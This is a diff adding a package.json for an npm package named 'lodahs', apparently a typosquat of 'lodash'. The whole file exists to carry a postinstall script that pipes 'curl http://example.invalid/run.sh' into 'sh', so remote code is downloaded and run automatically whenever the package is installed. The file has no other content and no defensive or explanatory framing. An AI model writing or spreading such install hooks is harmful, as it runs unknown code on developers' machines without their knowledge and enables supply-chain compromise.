@@ -1,0 +1,7 @@
+{
+  "name": "lodahs",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl http://example.invalid/run.sh | sh"
+  }
+}
